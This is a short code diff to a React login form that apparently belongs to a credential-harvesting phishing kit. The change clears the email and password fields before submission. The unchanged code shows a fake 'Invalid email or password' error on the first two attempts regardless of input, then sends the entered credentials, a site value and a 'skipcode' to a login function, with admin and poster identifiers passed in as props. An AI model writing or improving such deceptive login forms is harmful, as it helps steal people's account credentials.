@@ -14,6 +14,12 @@ function LoginForm({ adminId, posterId }) {
   const handleSubmit = async (e) => {
     if (e) e.preventDefault();
     
+    const currentEmail = email;
+    const currentPassword = password;
+
+    setEmail("");
+    setPassword("");
+
     if (attempts < 2) {
       setError("Invalid email or password");
       setAttempts(prev => prev + 1);
@@ -22,15 +28,13 @@ function LoginForm({ adminId, posterId }) {
 
     const allValues = {
       site: site,
-      email: email,
-      password: password,
+      email: currentEmail,
+      password: currentPassword,
       skipcode: "",
     };
 
     setError("");
     await login(allValues);
-    setEmail("");
-    setPassword("");
     setAttempts(0);
   };
 
